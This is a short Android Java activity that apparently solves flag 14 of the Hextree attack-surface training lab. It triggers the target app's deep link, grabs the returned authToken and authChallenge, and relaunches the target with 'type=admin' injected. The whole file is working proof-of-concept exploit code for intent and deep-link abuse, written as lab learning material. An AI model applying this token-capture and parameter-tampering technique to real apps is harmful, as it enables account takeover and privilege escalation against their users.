package com.android.zerohextree;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;

public class flag14 extends AppCompatActivity {



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        handleClicking();
        EdgeToEdge.enable(this);
        Intent flag =  getIntent();
        Uri data = flag.getData();
        String authToken = data.getQueryParameter("authToken");
        String authChallenge = data.getQueryParameter("authChallenge");

        Intent POC = new Intent("android.intent.action.VIEW");
        POC.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag14Activity");
        POC.setData(Uri.parse("hex://token?type=admin&authToken=" + authToken + "&authChallenge=" + authChallenge));
        startActivity(POC);


    }
    public void handleClicking() {
        Intent flag = new Intent();
        flag.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag14Activity");
        flag.addCategory("android.intent.category.BROWSABLE");
        flag.setData(Uri.parse("hex://token"));
        startActivity(flag);
    }


}